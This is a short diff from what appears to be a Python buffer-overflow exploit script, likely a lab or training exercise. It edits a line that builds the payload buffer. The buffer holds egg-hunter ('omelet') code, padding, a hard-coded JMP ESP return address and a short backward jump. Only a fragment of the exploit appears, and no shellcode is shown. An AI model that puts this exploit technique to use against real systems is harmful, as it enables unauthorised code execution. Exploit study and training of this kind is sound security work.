@@ -37,7 +37,7 @@ buf += omelet_code
 buf += "D"*(122-len(omelet_code)) # OMELET CODE goes here 
 #buf += "B"*4
 # 62501203
-buf += "\x03\x12\x50\x62"
+buf += "\x03\x12\x50\x62" # classic JMP ESP somewhere in earth
 
 #buf += "\x90"*2
 buf += "\xeb\x80"
